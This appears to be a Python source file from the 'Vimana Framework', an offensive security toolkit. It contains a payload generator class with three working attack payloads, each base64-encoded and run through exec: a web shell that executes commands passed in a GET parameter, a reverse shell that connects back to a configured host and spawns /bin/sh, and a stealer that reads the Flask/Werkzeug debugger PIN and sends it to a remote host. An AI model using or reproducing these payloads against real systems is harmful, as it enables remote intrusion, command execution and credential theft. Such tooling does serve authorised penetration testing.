# -*- coding: utf-8 -*-
#  __ _
#   \/imana 2016
#   [|-ramewørk
#
#
# Author: s4dhu
# Email: <s4dhul4bs[at]prontonmail[dot]ch
# Git: @s4dhulabs
# Mastodon: @s4dhu
# 
# This file is part of Vimana Framework Project.


from neotermcolor import colored
from random import randint, choice
from datetime import datetime
from mimesis import Generic
import secrets
import random
import base64
import codecs
import os

class VMNFPayloads:
    '''Vimana simple payload generators (v0.2)'''

    def __init__(self,**options):
        self.options = options

    def _vmnfp_payload_types_(self, pay_list=False, verbose=False):
        vmnfp_class = self.__class__
        vmnf_payloads = {}
        [vmnf_payloads.__setitem__(payload, getattr(vmnfp_class, payload).__doc__) \
            for payload in [attr for attr in dir(vmnfp_class) \
                if not attr.startswith('_')
            ]
        ]

        if pay_list:
            return vmnf_payloads
        
        if verbose:
            print("\033c", end="")
            print('\n\t {}'.format(
                colored('⣷⣒⠂    ', 'green')) + colored(' Vimana Payloads (v0.1)', 'magenta', attrs=[]) +\
                colored('    ⣸⣼⡀', 'green') + '\n\n'
            )

        for k,v in vmnf_payloads.items():
            print('{}{}:\t   \x1B[3m{}\x1B[23m'.format(
                    (' ' * int(5-len(k) + 14)),
                    colored(k,'cyan'),colored(v, 'green')
                )
            )
        print()

    def _encode_payload_(self, payload):
        '''simple base64 payload encoding'''
        
        print("[{}] → Generating {} payload...".format(
            colored(self.options['module_run'],'blue'),
            colored(self.options['payload_type'],'blue')
            )
        )
        return codecs.encode(payload.encode('ascii'),'base64')

    def pws_payload(self):
        """ Python base64 encoded web shell payload (via SimpleHTTPRequestHandler().serve_forever() in quiet mode)"""
        
        # create a random cmd var for webshell receive attackers commands via GET
        g = Generic('en')
        if not self.options['xpl_cmd_var']:
            xpl_cmd_var = str(g.person.title().replace('.','') + \
                g.person.first_name() + g.text.word().title())
        else:
            xpl_cmd_var = self.options['xpl_cmd_var']

        remote_port = (self.options['remote_port'])
        print('[{}] → using pws_get_var {}'.format(
            colored(self.options['module_run'],'blue'),
            colored(xpl_cmd_var, 'green')
            )
        )

        e_payload = self._encode_payload_("""\nimport os,socket,getpass\ntry:from http.server import SimpleHTTPRequestHandler;import socketserver as SS\nexcept ImportError: from SimpleHTTPServer import SimpleHTTPRequestHandler;import SocketServer as SS\nfrom subprocess import Popen, PIPE\ntry:p2_flag = False;from urllib.parse import urlparse, parse_qs, unquote\nexcept ImportError:p2_flag = True;from urlparse import urlparse,parse_qs,unquote\nclass HRH(SimpleHTTPRequestHandler):\n    def log_message(self, format, *args):pass\n    def do_GET(self):\n        _p_ = "$"\n        _cmd_ ='pwd'\n        self.send_response(200)\n        self.send_header("Content-type", "text/html")\n        self.end_headers()\n        _qc_ = parse_qs(urlparse(self.path).query)\n        if '_cmd_' in _qc_:_cmd_ = _qc_["_cmd_"][0].split()\n        try:process = Popen(_cmd_, stdout=PIPE, stderr=PIPE, universal_newlines=True)\n        except:return\n        stdout, stderr = process.communicate()\n        if os.geteuid() == 0:_p_ = "#"\n        _i_ = "<br>{}{} {}<br>".format(str(getpass.getuser()) + "@" + str(socket.gethostname()), _p_, ' '.join(_cmd_))\n        x ="<html><head><body><font face='monospace'>{}<br><br><br>".format(_i_)\n        for i in stdout.split('\\n'):x += (i + "<br>")\n        x +="</font></body></html>"\n        if p2_flag:self.wfile.write(bytes(x));return\n        self.wfile.write(bytes(x,'utf-8'));return\nSS.TCPServer(("",{_remote_port_}), HRH).serve_forever()\n""".replace("{_remote_port_}",str(remote_port)).replace('_cmd_',xpl_cmd_var))

        return f"""import codecs\nexec(codecs.decode({e_payload}, 'base64').decode())"""

    def olpcb_payload(self):
        """One-liner Python base64 encoded connect back payload (via subprocess.Popen(["/bin/sh","-i"]))"""
        
        # 0-65535 check to prevent overflowerror
        e_payload = self._encode_payload_(
            """import os,\
            socket,\
            subprocess;\
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\
            s.connect(('{}',{}));\
            os.dup2(s.fileno(),0);\
            os.dup2(s.fileno(),1);\
            os.dup2(s.fileno(),2);\
            p=subprocess.Popen(["/bin/sh","-i"],close_fds=True);
            """.format(
                self.options['local_host'],
                self.options['local_port']
            )
        )
        
        return f"""import codecs\nexec(codecs.decode({e_payload}, 'base64').decode())"""

    def flask_pinstealer(self):
        """Python Flask PIN stealer payload"""
        
        e_payload = self._encode_payload_(
        f"""import logging,socket,os\nl = logging.getLogger('werkzeug')\nhandler = logging.FileHandler('/tmp/.t.log')\nl.addHandler(handler)\nP=[line for line in open('/tmp/.t.log').readlines() if "Debugger PIN:" in line]\ns = socket.socket()\ns.connect(('{self.options['local_host']}',{self.options['local_port']}))\ns.send(str(P).encode());\ns.close()"""
        )
        
        return f"""import codecs\nexec(codecs.decode({e_payload}, 'base64').decode())"""


